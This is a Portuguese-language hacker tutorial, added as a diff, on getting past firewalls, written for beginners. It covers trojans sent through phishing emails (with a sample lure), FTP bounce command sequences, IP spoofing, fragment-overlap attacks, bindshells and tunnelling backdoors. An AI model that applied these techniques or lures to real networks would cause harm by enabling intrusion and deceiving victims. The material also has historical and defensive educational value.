@@ -1,0 +1,633 @@
+##########################################################################
+############################ UNSEKURITY TEAM #############################
+##########################################################################
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Este e outros textos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+
+OBS: Todas as Informacoes e Dados encontrados neste arquivo texto possuem
+     somente propositos educacionais.O Autor nao se responsabiliza pelo
+     mau uso dos mesmos.
+
+OBS2: ELITE NAO LEIA!!! NAO PERCA SEU TEMPO, ISSO NAO SERVIRAH PARA
+      VOCE! MAIS UMA VEZ, O PUBLICO ALVO EH O PESSOAL NEWBIE, OU SEJA,
+      ELITES FORA!!!
+
+                    **********************************
+		    * ILUSTRACOES BASICAS DE ALGUMAS *
+		    *   TECNICAS CONTRA FIREWALLS    *
+		    **********************************
+
+
+--------------------------------- INDICE -----------------------------------
+
+1. - INTRODUCAO
+2. - FIREWALLS
+3. - TECNICAS CONTRA FIREWALLS
+   3.1. - Trojans
+   3.2. - Bounce FTP.
+   3.3. - SPOOF.
+   3.4. - Fragmentacao de Pacotes.
+   3.5. - Backdoors Sobre Firewalls.
+4. - TERMINANDO
+   4.1. - Links e Referencias
+   4.2. - Consideracoes Finais
+
+---------------------------------------------------------------------------
+
+----------------
+1. - INTRODUCAO |
+----------------
+
+Longe de ir fundo em todos os possiveis contextos que envolvem a analogia
+e a implementacao de Tecnicas para se  passar por Firewalls, eu pretendo
+somente expor o basico sobre algumas Tecnicas visando o publico alvo
+NewBie.Com um pouco de dedicacao, torna-se facil expandir os conceitos
+para outras implementacoes tecnicas.Um Basico de TCP/IP, Linux, C, Sockets,
+e Conceito de Firewall se faz necessario.No entanto, pretendo explicar as
+teorias em detalhes para que nao haja nenhuma duvida nas implemetacoes.
+O que pretendo expor aqui eh ilustrativo, a dependencia de mais material
+sobre C, Sockets e TCP/IP se fazem necessarios para a exemplificacao das
+tecnicas, talvez num futuro proximo, essas tecnicas possam vir detalhadas
+com 'exploits exemplos' para as mesmas, no entanto, neste txt eu apenas
+irei me concentrar nas teorias que envolvem as tecnicas para que o fucador
+mais obstinado jah possa ir se adiantando sem esperar os futuros txts
+do Unsekurity Team sobre os assuntos ditos 'necessarios'.Entendendo a
+teoria,se dedicando e persistindo, voce estarah apto a implementacao das
+tecnicas que aqui serao descritas.
+
+---------------
+2. - FIREWALLS |
+---------------
+
+Muitos sistemas confiam em Softwares que se dizem capazes de barrar todo e
+qualquer pacote que nao "possua" uma permissao de entrada.Existem Dezenas
+de ferramentas com este conceito trabalhando em cima de hosts na Internet.
+O que este artigo pretende expor, eh que eh possivel 'enganar' esses
+softwares, tornando os mesmos ineficazes para nao dizer inuteis.
+Atualmente existem alguns conceitos de arquiteturas dominantes no mundo
+dos Firewalls, sao eles:
+
++ FILTROS DE PACOTES -> Esta arquitetura consiste num host ou roteador que
+			checa cada pacote verificando se o mesmo tem
+			permissao para ser enviado(roteado) para seu
+			destino, agindo como um filtro, barrando a entrada
+			de pacotes vindo de enderecos sem permissao e deixando
+			passar pacotes com enderecos permitidos.
+
++ SERVIDORES PROXIES -> Esta arquitetura consiste em um servidor qualquer
+			que nao possui o papel de roteador.Devemos nos
+			lembrar dos Servidores Proxies de Aplicacoes qualquer
+			como WWW e etc.Filtragem de pacotes via PROXY
+			obedecem a mesma regra dos outros servicos, ou seja,
+			o pacote para chegar no host destino precisa primeiro
+			passar pelo Servidor Proxy, e cabe ao Servidor Proxy
+			decidir ou nao se o pacote pode chegar ao seu
+			destino final.
+
+
+-------------------------------
+3. - TECNICAS CONTRA FIREWALLS |
+-------------------------------
+
+Neste item, seguem ilustracoes de algumas tecnicas basicas que em 
+determinados casos podem enviar pacotes, dados, comandos e etc sobre um 
+Firewall.
+
+3.1. - Trojans
+---------------
+
+A Tecnica mais conhecida de se exploitar um Firewall eh atraves da 
+disseminacao de Trojans Horses.Sabemos que neste caso, a imaginacao do
+atacante deve ser bem elevada, tendo em vista que ele vai estar a merce
+do usuario alvo.Varios esquemas com trojans horses podem ser explorados,
+abaixo seguem alguns desses possiveis esquemas:
+
++ Envio de Executavel -> Envia-se um executavel contendo backdoor para um
+  usuario 'meio' leigo.Logico que para isto voce vai necessitar possuir 
+  algum conhecimento sobre o sistema alvo, como por exemplo, uma conta de 
+  e-mail de um usuario e etc.. Um esquema para ficar bem claro poderia ser: 
+
+  Uma faculdade de quimica, voce poderia enviar para algum usuario(professor)
+  um executavel dizendo: 'PROGRAMA AUTOMATIZADOR DE CALCULOS 
+  ESTEQUIOMETRICOS'.Se puder enviar via fake mail seria melhor ainda.
+  O Executavel teria que conter uma abertura de uma porta nao filtrada, ou
+  mesmo uma acao que pudesse ser beneficiante no futuro mesmo com o
+  continuo uso do Firewall.
+
++ Inducao de Acao -> Consiste em induzir uma determinada acao de um
+  usuario para que se possa tirar proveito em cima dessa acao.Por Exemplo,
+  voce descobre que o sistema alvo possui um Sistema Operacional X e que
+  neste sistema, o Browser padrao eh vulneravel a uma condicao de
+  buffer overflow, voce poderia induzir este usuario a visitar uma pagina
+  e lah voce geraria um overflow que executaria codigos maliciosos na maquina
+  alvo.Um Exemplo de eng. social induzindo a acao deste modo poderia ser:
+
+  " Sr. Fulano, venho atraves deste e-mail avisar ao senhor que voce
+    acaba de ser contemplado com uma moto honda CG-125 num Sorteio
+    Realizado pelo site XXX. Recomendamos ao senhor que visite a pagina
+    http://paginacomoexploitparaobrowserbugado.com/hacker.html para ler
+    as instrucoes para aquisicao do premio."
+
+  Acho muito dificil ele nao ir visitar a pagina..:), logo ele foi
+  induzido a pratica de uma acao que pode ser tirada como proveito.
+  
+Em todas as implemetacoes com uso de Trojans Horses, voce estah a merce do
+usuario que poderah executar o trojan, ou seja, se ele for esperto, voce
+pode se dar mal e ateh mesmo se expor.Entao, mano, Trojan Horse soh depois
+que os esquemas abaixo tiverem falhado.
+
+
+3.2. - Bounce FTP
+------------------
+
+Alguns Firewalls filtram pacotes atraves da checagem dos Datagramas.Um
+Exemplo de um esquema desses pode ser um servidor de ftp ftp.alvo.com.
+Digamos que alvo.com possua um ip 200.200.199.1, e este firewall soh
+permite conexoes neste servidor de ftp, IPs que compreendem de 200.200.199.1
+ateh 200.200.199.255, ou seja, somente a classe C do IP do servidor
+(200.200.199.*), voce nao estah nessa classe, entao voce precisaria 
+conseguir um IP que estah dentro desta classe.Pacientemente voce scaneia a
+rede e descobre que existe um servidor de FTP aberto em um dos hosts que
+possuem permissao para se conectar ao ftp.alvo.com, chamaremos este
+servidor de ftp.ponte.gov.Voce poderia usar este host como "ponte" entre 
+voce e o servidor ftp.alvo.com, enganando assim o firewall.Um metodo para se 
+fazer isto eh conhecido como 'FTP BOUNCE'.Logico que se seus conhecimentos 
+forem maiores voce poderia exploitar o sistema intermediario e de lah mesmo 
+se conectar ao sistema alvo.Mas a questao aqui eh que voce quer enviar 
+pacotes para o servidor alvo.com.Vamos analisar um ataque amplamente
+descrito na Internet, que foi originalmente publicado por Hobbit, que
+consiste em baixar um arquivo do servidor de FTP ftp.alvo.com(arquivo.txt)
+via servidor ponte de FTP ftp.ponte.gov.
+
+O ataque consiste basicamente no seguinte:
+
+Assumindo que voce possui um servidor de ftp que faz modo passivo.Abra uma
+conexao de FTP para o ip de sua propria maquina(sem ser localhost) e
+logue-se nela.Mude para um diretorio conveniente que voce tenha acesso a 
+escrita e entao faca:
+
+        quote "pasv"
+        quote "stor foobar"
+
+Anote o endereco e a porta que sao retornadas pelo comando PASV, exemplo
+123,234,122,23,102,121.Esta sessao de FTP deve ser entao suspensa, entao
+jogue-a para background, ou entao abra outro console ou janela para dar
+sequencia a este esquema.
+
+Construa um arquivo contendo comandos de servidor de FTP.Exemplo segue
+abaixo:
+
+        user ftp
+        pass -anonymous@
+        cwd /restrito
+        type i
+        port F,F,F,F,X,X
+        retr arquivo.txt
+        quit
+        ^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
+        ^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
+        ...
+
+Podemos chamar este arquivo de "instrs".F,F,F,F,X,X eh o mesmo endereco
+e porta que sua propria maquina colocou em suas maos na primeira conexao.
+O lixo no fim sao linhas extras que voce criou, cada linha contem 250
+NULLS e nada mais, suficiente para encher 60k de dados extra.A razao para
+este enchimento eh explicado mais abaixo.
+
+Abra uma conexao para ftp.ponte.gov, logue-se nele como anonymous e 
+cd /incoming.Agora digite o seguinte nesta sessao de FTP:
+
+        put instrs
+        quote "port C,C,C,C,0,21"
+        quote "retr instrs"
+
+Isto irah transferir uma copia do seu arquivo "instrs" e entao chamarah
+ftp.C,C,C,C,0,21 que eh o endereco IP e as portas para conexao no alvo.Apos o
+download do arquivo arquivo.txt, ele deverah aparecer com o nome de foobar em
+sua maquina via a sua primeira conexao de FTP, ou seja, no seu proprio
+host.Se uma conexao para ftp.ponte.gov nao pode terminar por sih mesma,
+apague seu arquivo "instrs" e saia do servidor.De outro modo voce terah que
+reconectar ao servidor para terminar.
+
+Podemos notar neste esquema que ele pode ser usado para passar por
+Tripwire,Filtros e Firewalls via implementacoes Bouncing.Existem scanners
+de portas que se utilizam desta fraqueza e varios outros esquemas tambem sao 
+implementados via esse problema.Hoje em dia a maioria dos servidores de
+FTP nao sao mais vulneraveis a isto, mas ainda existem hosts a merce
+desta tecnica, variantes dela, bem como solucao de problemas poderao
+serem vistos no txt do *Hobbit*, link para o mesmo segue no item final
+'Links e Referencias'.
+
+
+3.3. - SPOOF
+-------------
+
+A Beleza desta tecnica eh incontestavel, creio que esta eh uma das tecnicas
+fucadoras mais "conhecida" em todo o mundo, no entanto, nao sao tantas as
+pessoas que a dominam.As tecnicas que envolvem o conceito de SPOOF(IP
+Spoof, DNS Spoof e etc) sao caracterizadas basicamente pela adulteracao do
+IP origem do emissor, ou seja, um atacante envia um pacote para uma rede
+alvo com IP de uma rede diferente da rede a que ele se encontra.Esta
+tecnica tem suas diversas utilidades e dentre elas a 'passagem de pacotes'
+por um Firewall, ou seja, uma Rede A pode enviar pacotes para uma rede B,
+voce se encontra num host C sem permissao de envio de pacotes para a 
+rede B, logo, atraves das tecnicas de SPOOF, eh possivel voce mandar
+pacotes como se fosse A para a rede B, vejamos uma ilustracao para isto:
+
+			  ___
+    --------	IP de A	 | F |
+   | Rede A |  ----------| I | - - -
+    --------		 | R |	    |	          --------
+			 | E |      - - - - - - -| Rede C |
+   ----------	IP de C	 | W |		         |  Alvo  |
+  |  Rede C  | ----------| A |		          --------
+  | atacante |           | L |
+   ----------            | L |
+			  ---
+
+No esquema acima, o FIREWALL irah filtrar os pacotes e permitir somente
+que os pacotes vindos com endereco da 'Rede A' possam chegar ao destino,
+no caso, a Rede C.
+
+Um atacante poderia entao enviar pacotes com endereco origem forjado, ou
+seja, adulterados com o endereco da Rede A, fazendo o FIREWALL pensar
+que o pacote estah vindo de um host com permissao, logo, ele permitiria
+a chegada desses pacotes na Rede C.Vejamos abaixo uma ilustracao para isto:
+
+
+                          ___
+    --------    IP de A  | F |
+   | Rede A |       -----| I | - - -
+    --------       |     | R |      |             --------
+                   |     | E |      - - - - - - -| Rede C |
+   ----------      |     | W |                   |  Alvo  |
+  |  Rede B  | ----      | A |                    --------
+  | atacante |           | L |
+   ----------            | L |
+                          ---
+
+
+Note que a Rede A nao estah enviando um pacote e sim a Rede C, mas no
+entanto o pacote estah indo com endereco origem de A, o FIREWALL poderia
+entao ser enganado e o pacote malicioso poderia entao chegar na rede Alvo.
+
+Existem varias implementacoes de SPOOF, como eu jah havia dito.Nao vou
+entrar em detalhes mais tecnicos, mas mandar um pacote forjado via IP
+SPOOF eh relativamente facil.Varios DoS usam este conceito.Tem gente que
+nao ve nada de util em DoS, mas existem casos em que ele eh necessario,
+por exemplo, digamos que voce acesse um servidor Red Hat Apolo antigo,
+como um usuario normal e neste servidor haja um arquivo em /etc/rc.d com
+permissao de escrita para todo mundo.Voce mudaria o arquivo para execucao
+de codigo malicioso, mas como reiniciar a maquina se voce ainda nao eh root?
+Aih que vem o DoS como uma tecnica boa e eficaz! Outros esquemas podem ser
+vistos em servidores r*, mas foge ao objetivo deste tutorial descrever isto.
+
+Eh possivel ateh mesmo scanearmos um servidor atras de informacoes uteis
+usando IP SPOOF.Mais dados sobre SPOOF no item 'TERMINANDO',no final deste
+arquivo texto.
+
+3.4. - Fragmentacao de Pacotes.
+--------------------------------
+
+Elite, nao leia!!!! Nao acrescentarei nenhum i ao que jah foi divulgado
+Internet a fora!Nao perca seu tempo lendo isto aqui!
+ 
+Esta eh uma tecnica muito interessante e as implementacoes que sao
+possiveis usando a mesma podem ser consideradas infindaveis.De todas as
+tecnicas que vimos ateh agora, para mim esta eh a mais interessante e
+tambem a que mais estah envolvida em 'escuridao', ou seja, o pessoal que
+mexe com hacking ou cracking mais avancado nao divulga informacoes sobre
+a mesma, pois eh enorme o numero de Firewalls vulneraveis a implementacao
+desta tecnica.O Uso dela eh bastante abrangente, pode-se "passar" 
+literalmente por um firewall tornando o Firewall completamente inutil do
+ponto do vista do invasor, mas no entanto esta tecnica eh muito usada em
+programas DoS, principalmente para sistemas Windows.Para que possamos
+entende-la plenamente eu irei descrever algo sobre o que eh a Fragmentacao
+de Pacotes no TCP/IP.Abaixo segue a definicao do conceito(extraido do livro
+'Arquiteturas de Redes de Computadores - OSI e TCP/IP - Brisa'):
+
+- Como um datagrama trafega atraves de diversos tipos de rede e cada
+tecnologia tem um tamanho de bloco diferente, a camada IP possui o
+mecanismo de 'fragmentacao', para garantir que um datagrama possa
+atravessar redes que utilizem tamanhos de blocos de transmissao diferentes.
+Quando for necessario transportar um datagrama de tamanho maior do que
+aquele que a sub-rede pode suportar, o mecanismo de fragmentacao eh
+acionado.O datagrama original eh particionado em "fragmentos".O tamanho
+de fragmento eh determinado de maneira a poder ser transportado em um
+unico bloco de transmissao da sub-rede.
+  Os fragmentos sao transportados como se fossem datagramas independentes
+ateh o destino.Ao receber o primeiro fragmento, a estacao inicia uma
+temporizacao para aguardar o conjunto completo de fragmentos; se algum
+faltar, o datagrama eh descartado.Assim,o processo de fragmentacao provoca
+uma perda de eficiencia devido a preservacao dos fragmentos ateh a estacao
+destinataria(mesmo que sejam transportados por sub-redes com tamanho de
+blocos superiores) e devido ao aumento do indice de retransmissao nos
+casos de perda de fragmentos, quando, entao, o datagrama completo eh
+descartado.
+  Para fragmentar um datagrama longo, sao criados varios datagramas menores
+que recebem uma copia do cabecalho do datagrama original sendo alguns dos
+seus campos modificados.Nos datagramas criados, o tamanho da parte de dados
+eh multiplo de 8 octetos e estah limitado pelo tamanho maximo do bloco de
+transmissao permitido na sub-rede.Pode ser que o ultimo fragmento nao seja
+multiplo de 8 octetos.Na definicao do tamanho do fragmento sao levadas em
+conta a parte dos dados e a do cabecalho.A primeira parte dos dados do 
+datagrama original eh inserida no primeiro fragmento e neste o campo
+'comprimento total' eh atualizado com o tamanho dessa parte de dados e
+do cabecalho.Nesse primeiro fragmento, um dos bits do campo 'flags',
+chamado bit 'mais-fragmentos', recebe o valor 1 para indicar que mais
+fragmentos deverao seguir-se.O seu campo de offset de fragmento permanece
+igual ao do datagrama original.
+  O restante dos dados eh inserido em fragmentos subsequentes.Nestes, o
+campo 'comprimento total' corresponde a quantidade de dados efetivamente
+enviada.O valor do 'offset de fragmento' em cada um desses fragmentos eh
+a soma do 'offset de fragmento' e do numero de octetos de dados do
+fragmento anterior.Se o fragmento nao for o ultimo, o bit 'mais-fragmentos'
+do campo 'flags' recebe o valor 1; caso contrario, o valor "0".Alem destes
+campos, outros podem ser alterados, como o campo de opcoes, o campo de
+comprimento de cabecalho e o checksum.
+  Na recepcao, um datagrama eh reconhecido como fragmento pela indicacao
+do bit 'mais-fragmentos' do campo 'flags' e da ocorrencia de valor
+diferente de zero no campo 'offset de fragmento'(exceto se for o primeiro
+fragmento).Os fragmentos de um mesmo datagrama sao identificados atraves
+do campo 'identificacao', dos enderecos IP de origem e de destino e do
+campo de protocolo, copiados a partir do datagrama original no momento da
+fragmentacao.O ultimo fragmento eh identificado por ter o campo 'mais-
+fragmentos' igual a zero e pelo valor diferente de zero do campo 'offset
+de fragmento'.
+
+Este eh o basico sobre fragmentacao de pacotes IP.Este livro,"Arquiteturas
+de Redes de Computadores - OSI e TCP/IP - Brisa" realmente eh um bom livro.
+Recomendo a aquisicao do mesmo, mas caso nao de, de uma olhada nos RFCs.
+Abaixo segue um exemplo de um cabecalho IP:
+
+ 0      3  4   7 8             15 16				     32
+ ----------------------------------------------------------------------
+|versao  | IHL  | Tipo de servico |        Comprimento Total           |
+ ----------------------------------------------------------------------
+|       Identificacao             |  flags |   Offset de fragmento     |
+ ----------------------------------------------------------------------
+| Tempo de vida |    Protocolo    |        checksum do cabecalho       |
+ ----------------------------------------------------------------------
+|                       Endereco de origem                             |
+ ----------------------------------------------------------------------
+|                       Endereco de destino                            |
+ ----------------------------------------------------------------------
+|                       opcoes                           |   padding   |
+ ----------------------------------------------------------------------
+|                              dados                                   |
+ ----------------------------------------------------------------------
+
+
+Se quiser mais detalhes sobre isso, de uma olhada no meu Tutorial Basico 
+de Programacao de Sockets em C para Linux que pode ser obtido na pagina
+do Unsekurity Team, por esses dias mais material sobre TCP/IP deve estar
+sendo publicado por lah.
+
+O Ataque via Fragmentacao de pacotes acontece justamente com base no modo
+como os pacotes sao reunidos(reagrupados) no final da fragmentacao.Os
+Datagramas foram imaginados para serem fragmentados sobre pacotes que 
+deixam a parte do cabecalho do pacote intacta exceto por uma modificacao
+do pedaco do pacote fragmentado e o enchimento do campo de um offset do
+cabecalho IP que indica em qual byte do datagrama completo o pacote atual
+deverah comecar.No reagrupamento, o reagrupamento IP cria um pacote temporario
+com uma parte fragmentada do datagrama no lugar e adiciona fragmentos que 
+estao a caminho para seus respectivos campos de dados no offset especificado 
+com o datagrama sendo reagrupado.Assim que o datagrama completo eh
+reagrupado, ele eh processado como se ele tivesse vindo como um pacote
+unico(singular).De acordo com a especificacao do Protocolo IP, pacotes
+fragmentados sao para serem reagrupados no host receptor.Isto presumivelmente
+faz com que eles nao sejam imaginados(ou supostos) para serem reagrupados em
+'sitios' intermediarios como firewalls ou roteadores.Esta decisao foi feita
+provavelmente para prevenir repeticoes de reagrupamentos e refragmentacao
+em redes intermediarias.Quando Roteadores e Firewalls seguem as regras,
+eles encontram um problema peculiar.
+
+O Modo que os Firewalls e Roteadores bloqueiam servicos especificos como
+telnet enquanto permitem outros servicos como HTTP eh encontrado sobre o
+pacote IP para determinar qual porta TCP estah sendo usada.Se a porta
+corresponde a 80, o datagrama eh destinado ao servico HTTP e passa pelo
+Filtro perfeitamente, se a porta corresponde a 23, o datagrama eh
+destinado ao servico TELNET e o filtro barra a entrada do pacote.Em
+datagramas normais, isto funciona perfeitamente.Mas suponha que nos nao
+seguimos as regras para fragmentacao e criamos pacotes fragmentados 
+impropriamente? Abaixo seguem possiveis passos para a implementacao deste
+esquema:
+
+* Cria-se um pacote inicial que clama ser o primeiro fragmento de um datagrama
+  de um pacote multi-fragmentado.Especifica a porta TCP 80 no cabecalho
+  TCP.O Filtro irah encontrar um pacote com porta destino igual a 80 e
+  permitirah a passagem pois este servico (HTTP) nao eh filtrado em nosso
+  exemplo.
+
+* O Filtro entao passa o pacote para o host sobre ataque e passa os pacotes
+  subsequentes em ordem para que o host destino possa reagrupar os pacotes.
+
+* Um dos pacotes subsequentes pode entao possuir um offset de 0 que causa
+  o reagrupamento para sobrescrever a parte inicial do pacote IP.Esta eh a
+  parte do pacote IP que especifica a porta TCP destino.O atacante entao
+  sobrescreve o numero da porta que era originalmente 80 com um novo numero
+  de porta, por exemplo, 23.Entao, a partir de agora ele possui acesso
+  garantido ao servico TELNET no host sobre ataque, despistando assim o
+  firewall.
+
+Interessante, nao??? Acho que se eu fosse administrador de rede e na minha
+rede tivesse um Firewall e um SO de codigo-fonte fechado, eu temeria muito
+esta tecnica.A implementacao dela, como podemos ver torna um Firewall
+completamente "INUTIL".Um administrador deve ter muito juizo ao escolher
+um Firewall e um SO para a instalacao em sua rede, senao, um invasor com
+conhecimentos avancados pode literalmente 'brincar' com o sistema dele.
+
+
+3.5. - Backdoors Sobre Firewalls.
+----------------------------------
+
+Muitos sao os tipos possiveis de backdoor sobre Firewalls, e como sempre,
+depende de cada caso, a implementacao eficiente destas tecnicas.Existem
+esquemas quase que 'padronizados' de configuracao de Firewall, o que eu
+digo eh o seguinte: 
+
+* Algumas portas de alguns servicos nao possuem qualquer filtragem, recebendo 
+  pacotes de qualquer lugar da internet, exemplo disso eh a porta 80(http);
+
+* Alguns servidores permitem envio e recebimento de pacotes ICMP,UDP e
+  outros, sendo que alguns necessitam disso para poderem fazer checagens de 
+  roteamento e de erros no roteamento e etc;
+
+Na grande maioria dos sistemas que usam Firewall, uma simples bindshell pode
+ser usada para abrir uma porta que nao estah configurada para ser 'filtrada'
+pelo Firewall,o proprio netcat pode ser usado com um bindshell, logo, uma
+backdoor bindshell seria um bom exemplo de backdoor sobre firewall.
+Alem do mais, as tecnicas de camuflagem de bindshell podem ser expansivas
+com o uso de LKMs ou alteracao de binarios tornando uma backdoor do tipo
+bindshell de dificil percepcao.
+
+Mas dependendo da rede, um fucador precisa ir mais longe e implementar
+uma backdoor que canaliza um 'Tunel'.Os tuneis sao conhecidos justamente
+por essa particularidade que eh, poderem passar por Firewalls.Como vimos
+acima, existem redes que permitem envio de pacotes por qualquer host
+localizado na internet a uma porta do sistema, no exemplo(80).Existem
+diversas implementacoes de Tuneis que canalizam dados atraves da porta
+80, seria uma especie de servidor remoto na porta 80.Como o Firewall do
+alvo nao filtra pacotes na porta 80, ele nao teria como barrar a entrada
+destes pacotes.Na parte de 'Links e Referencias' voce pode encontrar mais
+material sobre isto.
+
+Outro tipo de Tunel segue um padrao em cima de um protocolo que um Firewall
+nao filtra.Por exemplo, o ICMP.Varios sistemas permitem o envio e recebimento 
+de pacotes ICMP sem filtragem de enderecos, logo, um invasor poderia instalar
+um tunel capaz de enviar comandos atraves de datagramas ICMP a uma backdoor
+(servidor)em ICMP.Como o Firewall nao filtra pacotes ICMP, ele deixaria os
+pacotes passarem, deixando o servidor alvo a merce de execucao de comandos
+maliciosos.
+Existem Tuneis em varios protocolos, sendo os mais difundidos, os para ICMP 
+e para UDP.Mais informacoes sobre eles, consulte os links na parte 'Links
+e Referencias'.
+
+Dependendo de qual Firewall se encontra em um sistema, eh possivel ainda
+construir uma backdoor em cima do seu binario.O ipfw do Linux eh um
+exemplo disso, atraves de um LKM voce pode esconder sniffers e bindshell
+facilmente da 'filtragem' que ele executa, ou seja, eh possivel que ele
+esteja configurado para 'filtrar' acesso a uma porta X, mas atraves do
+LKM, voce pode engana-lo, deixando que o sistema receba os pacotes.
+
+Outras implementacoes ainda podem serem feitas em alguns casos, como:
+
+* Backdoor usando fragmentacao de pacotes;
+* Backdoor atraves de Bouncers;
+* Adulteracao da Configuracao do Firewall;
+* Adulteracao ou troca dos binarios de um Firewall;
+* Redirecionamento de Executaveis de um Firewall;
+
+Enfim, esquemas para backdoors em cima de Firewalls tem de sobra, fora
+as que eu desconheco por completo.Uma vez o sistema na mao de um invasor,
+fica dificil para um administrador de sistemas nao ter seu sistema alterado  
+de forma eficiente para permitir um acesso futuro deste invasor.
+
+----------------
+4. - TERMINANDO |
+----------------
+
+Sem duvida que um Firewall aumenta a seguranca de um sistema.Deve sempre
+ser usado, mas se voce eh administrador de um sistema eh bom estar atento
+as diversas formas com que um invasor pode passar por seu Firewall.Para
+um fucador, essas sao apenas as tecnicas basicas que eu conheco, devem
+existir muitas outras por aih, pesquise e vah fundo!! Eu sei que a
+construcao de programas para a execucao desta tecnica nao eh facil, mas
+parte abaixo 'Links e Referencias' voce acharah muito material sobre o
+que foi descrito neste txt, mas o importante eh voce procurar entender o
+conceito e expandir o conceito! Amigo, NewBie, de tempo ao tempo!! Se voce
+se esforcar, certamente um dia irah conseguir fazer seus proprios
+programas e nao irah depender de terceiros!! Eu acredito em voce!!
+
+
+4.1. - Links e Referencias
+---------------------------
+
+Aqui seguem Links onde voce poderah achar mais material sobre os itens
+abordados no decorrer deste txt.
+
+* SOBRE FTPBOUNCE:
+
+http://packetstorm.securify.com/docs/hack/ftpbounce.txt
+http://packetstorm.securify.com/UNIX/utilities/ftpbounce-1.25.tar.gz
+http://www.insecure.org/nmap/
+
+* SOBRE SPOOF:
+
+IP-Spoofing Demystified by Daemon9 
+URL: http://www.2600.com/phrack/p48-14.html
+
+http://packetstorm.securify.com/spoof/ip-spoof-guides/
+http://packetstorm.securify.com/spoof/
+http://packetstorm.securify.com/UNIX/scanners/hping2-beta54.tar.gz
+
+OBS: No momento a pagina da phrack estah derrubada, recomendo ir na 2600.
+
+* SOBRE FRAGMENTACAO DE PACOTES:
+
+http://teso.scene.at/releases/lamescan-1.0.tar.gz -> scan em frag.
+http://packetstorm.securify.com/docs/hack/frag.txt -> txt do hobbit.
+http://packetstorm.securify.com/UNIX/scanners/hping2-beta54.tar.gz
+http://www.enteract.com/~lspitz/fwtable.html -> Fragmentacao em FW1.
+
+* SOBRE BACKDOORS SOBRE FIREWALLS:
+
+Placing Backdoors Through Firewalls by van Hauser
+http://www.infowar.co.uk/thc/files/thc/fw-backd.htm
+
+http://teso.scene.at/releases/itunnel-1_2.tar.gz -> ICMP tunel.
+http://packetstorm.securify.com/UNIX/misc/udpshell_v1-0.tgz
+http://packetstorm.securify.com/UNIX/misc/httptunnel-3.0.3.tar.gz
+http://www.infowar.co.uk/thc/files/thc/rwwwshell-1.6.perl
+http://packetstorm.securify.com/UNIX/misc/mailtunnel-0.2.tar.gz
+
+Project Loki: ICMP Tunneling by daemon9 
+URL: http://www.2600.com/phrack/p49-06.html
+
+LOKI2 (the implementation) by route 
+URL: http://www.2600.com/phrack/p51-06.html
+
+TXT do module sobre ICMP Tunel
+URL: http://unsekurity.virtualave.net/txts/icmp_tunneling.txt
+
+* OUTROS:
+
+Piercing Firewalls by bishnu 
+URL: http://www.2600.com/phrack/p52-16.html
+
+http://sites.inka.de/lina/freefire-l/tools.html
+
+* HOME PAGE DO UNSEKURITY TEAM:
+
+http://unsekurity.virtualave.net/
+
+* OUTROS SITES INTERESSANTES:
+
+http://www.bufferoverflow.org/
+http://www.securenet.com.br/
+http://www.taldowin.com.br/
+http://www.absoluta.org/
+
++ Referencias:
+--------------
+
+Alem dos textos do hobbit sobre FTP Bounce, do van Hauser sobre backdoors
+sobre Firewall, dos Tuneis do pessoal descrito acima, tem o livro
+abaixo:
+
+Arquiteturas de Redes de Computadores - OSI e TCP/IP.
+2a. edicao Revisada e Ampliada.
+Brisa.
+Makron Books.
+
+4.2. - Consideracoes Finais
+----------------------------
+
+Aih estah mais um txt basico.. Tem gente lendo meus txts e achando que
+eles sao grande coisa... Nao sao nao manos!! Tem muito o que ser dito e o
+que se aprender ainda.. Sejamos humildes ao maximo!! Devemos ter em mente
+que 'quanto mais aprendemos mais sabemos que temos mais a aprender'.E
+somente um esforco conjunto na troca de informacoes pode elevar isto a
+uma esfera maior e mais rapida.Convoco desde jah os hackers e fucadores
+de verdade a se engajarem nesta luta em prol de uma liberdade maior de
+informacoes!! A uniao faz a forca!
+
+Gostaria de agradecer a todo Unsekurity Team e ao pessoal que vem apoiando
+e criticando o nosso 'trabalho'.Estamos apenas engatinhando num projeto
+bem mais amplo e, creio eu, temos sido bem sucedidos ateh entao.Ha muito
+trabalho pela frente, mas ateh aqui, a uniao do grupo Unsekurity Team eh
+a principal responsavel pelo sucesso de abrangencia que nossos txts
+alcancaram, sem essa uniao, acho que jamais eu teria sequer publicado uma
+linha qualquer de txt, mesmo brigando por uma concientizacao maior sobre
+o hacking.
+
+Um abraco.
+
+						Nash Leon.
+
+
+-------------------------------- EOF -------------------------------------
